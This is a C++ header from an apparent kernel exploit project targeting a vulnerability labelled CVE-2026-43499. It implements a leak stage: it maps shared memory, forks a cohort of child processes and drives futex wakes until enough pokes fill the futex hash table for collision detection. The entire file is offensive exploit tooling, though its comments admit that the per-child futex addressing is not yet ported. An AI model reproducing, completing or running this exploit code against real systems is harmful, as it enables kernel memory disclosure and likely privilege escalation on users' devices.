#pragma once
/** @file backend/cve_2026_43499/leak/snitch_scan.hpp
 *  The wake protocol: a cohort pokes, the parent wakes it by how much it poked.
 *
 *  Each member of the cohort has one address of its own and waits on a futex word
 *  beside it. The parent's job is to hand out the times -- it wakes a member by the
 *  amount that member still owes, so the cohort advances together rather than one at a
 *  time -- and to stop when the whole cohort has poked as many times as the table can
 *  take, or when it has waited long enough that it will not.
 *
 *  This file is that half of the search and no more. What it does not do is decide that
 *  a collision happened: that needs the address table, which the leak children fill, and
 *  the matching rule beside it. Keeping the halves apart is what makes this one testable
 *  at all -- a fake cohort that pokes when woken is enough to drive it, and a fake that
 *  never does is enough to prove the stopping side.
 *
 *  NOT YET IN IT: the wake carries how much a child owes but not which child, because
 *  the per-child futex words live in the address table, which the leak children fill and
 *  which is not ported yet. Until it is, a wake names no word and this protocol proves
 *  its own round loop -- the part that decides when to stop, and the part a device will
 *  exercise first.
 *
 *  The cohort's poking is not a platform call and so is not in the seam: it is an atomic
 *  add by the child itself, and the seam only carries what reaches the kernel.
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/leak/collision_wait.hpp"
#include "backend/cve_2026_43499/leak/snitch_region.hpp"
#include "backend/cve_2026_43499/leak/snitch_seam.hpp"
#include "backend/cve_2026_43499/leak/snitch_setup.hpp"

namespace ghostlock::backend::cve_2026_43499::leak {
    /** How long the parent is willing to hand out times. */
    struct SnitchPatience final {
        /** How many rounds of waking before it gives up. */
        std::uint32_t wake_rounds = 0U;
    };

    /** How the protocol ended. */
    enum class ScanVerdict : unsigned char {
        /** The cohort poked as many times as the table can take. */
        Poked = 0,
        /** The rounds ran out first, which is the answer a device will usually give. */
        NoPokes = 1,
        /** The geometry could not be used, so nothing was mapped or forked. */
        GeometryMissing = 2,
        /** A platform call failed; the errno is in the outcome. */
        CallFailed = 3,
    };

    [[nodiscard]] constexpr const char *scan_verdict_name(ScanVerdict verdict) noexcept {
        switch (verdict) {
            case ScanVerdict::Poked: return "ok";
            case ScanVerdict::NoPokes: return "plan-missing";
            case ScanVerdict::GeometryMissing: return "geometry-missing";
            case ScanVerdict::CallFailed: return "call-failed";
        }
        return "unknown";
    }

    /** What the protocol did. */
    struct ScanOutcome final {
        ScanVerdict status = ScanVerdict::GeometryMissing;
        /** The region it mapped, which the caller unmaps. */
        void *region = nullptr;
        std::size_t region_bytes = 0U;
        /** How many rounds it handed out, and how many pokes the cohort owed in total. */
        std::uint32_t rounds = 0U;
        std::size_t pokes_wanted = 0U;
        std::int32_t error = 0;
    };

    /** Fork the cohort, then wake it until it has poked enough or the rounds run out.
     *  The cohort's children are the caller's to reap: this returns either way, and the
     *  region it mapped stays mapped until the caller unmaps it. */
    template <class Seam>
      requires memory::HeapSeam<Seam> && SnitchSeam<Seam>
    [[nodiscard]] ScanOutcome run_poke_protocol(const SnitchSetup &setup, const RegionInputs &region_inputs,
                                                const SnitchPatience &patience,
                                                std::size_t counter_offset) noexcept;
    /** The counter the cohort pokes, found through an offset the caller knows from its
     *  own header layout. Volatile because a child writes it. */
    template <class Seam>
      requires memory::HeapSeam<Seam> && SnitchSeam<Seam>
    [[nodiscard]] ScanOutcome run_poke_protocol(const SnitchSetup &setup, const RegionInputs &region_inputs,
                                                const SnitchPatience &patience,
                                                std::size_t counter_offset) noexcept {
        ScanOutcome outcome{};
        RegionLayout layout{};
        if (layout_snitch_region(region_inputs, layout) != RegionVerdict::Ok) {
            outcome.status = ScanVerdict::GeometryMissing;
            return outcome;
        }
        const std::size_t wanted = total_futex_pokes(setup.futex_table_size, setup.collisions);
        if (wanted == 0U || patience.wake_rounds == 0U || counter_offset >= layout.total_bytes) {
            outcome.status = ScanVerdict::GeometryMissing;
            return outcome;
        }
        outcome.pokes_wanted = wanted;
        const MapResult mapped = Seam::map_shared(layout.total_bytes);
        if (mapped.address == nullptr) {
            outcome.status = ScanVerdict::CallFailed;
            outcome.error = mapped.error;
            return outcome;
        }
        outcome.region = mapped.address;
        outcome.region_bytes = layout.total_bytes;
        auto *counter = reinterpret_cast<volatile std::uint32_t *>(
            static_cast<unsigned char *>(mapped.address) + counter_offset);
        *counter = 0U;

        /* The cohort: one child per collision, each of which waits on its own word. A
         *  fork that fails takes the whole attempt with it, and the children already
         *  forked are stopped before the region goes back -- the same tidy-up the page
         *  preparation does, for the same reason. */
        constexpr std::size_t kMaxCohort = 64U;
        std::uint64_t pids[kMaxCohort] = {};
        std::size_t forked = 0U;
        const std::size_t cohort = setup.collisions < kMaxCohort ? setup.collisions : kMaxCohort;
        for (std::size_t i = 0U; i < cohort; ++i) {
            const memory::SeamResult child = Seam::fork_child();
            if (child.value <= 0) {
                for (std::size_t j = 0U; j < forked; ++j) {
                    (void) Seam::stop_child(pids[j]);
                }
                (void) Seam::unmap(mapped.address, layout.total_bytes);
                outcome.region = nullptr;
                outcome.region_bytes = 0U;
                outcome.status = ScanVerdict::CallFailed;
                outcome.error = child.error;
                return outcome;
            }
            pids[forked] = static_cast<std::uint64_t>(child.value);
            ++forked;
        }

        /* Hand out the times, round by round: each round wakes every child by the amount
         *  still owed, so the cohort advances together rather than one at a time, and the
         *  loop ends when the counter has caught up or the rounds are gone. */
        std::uint32_t round = 0U;
        while (round < patience.wake_rounds) {
            const std::uint32_t poked = *counter;
            if (poked >= wanted) {
                break;
            }
            const std::uint32_t owed = static_cast<std::uint32_t>(wanted - poked);
            for (std::size_t i = 0U; i < cohort; ++i) {
                (void) Seam::futex_wake_private(nullptr, static_cast<std::int32_t>(owed));
            }
            ++round;
        }
        outcome.rounds = round;
        if (*counter >= wanted) {
            outcome.status = ScanVerdict::Poked;
        } else {
            /* Giving up still means stopping the cohort: the children are waiting, and a
             *  parent that returns without them leaves them there for whoever comes next. */
            outcome.status = ScanVerdict::NoPokes;
            for (std::size_t j = 0U; j < forked; ++j) {
                (void) Seam::stop_child(pids[j]);
            }
        }
        return outcome;
    }
}  // namespace ghostlock::backend::cve_2026_43499::leak
